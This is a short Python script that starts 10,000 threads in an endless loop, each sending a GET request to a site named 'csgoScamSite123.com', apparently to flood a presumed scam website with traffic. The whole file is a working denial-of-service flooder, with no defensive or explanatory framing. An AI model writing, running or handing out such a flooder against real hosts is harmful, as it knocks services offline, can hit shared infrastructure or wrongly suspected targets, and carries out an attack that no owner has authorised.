import requests
import threading
import json
siteLink = "https://csgoScamSite123.com"
def send():
    requests.get(siteLink)
numOfThreads = 10**4
arr = []
for i in range(numOfThreads):
    arr.append("")
while True:
    for i in range(numOfThreads):
        newThread = threading.Thread(target=send)
        arr[i]= newThread
        newThread.start()
        print("1")
    for i in range(numOfThreads):
        arr[i].join()
        print("2")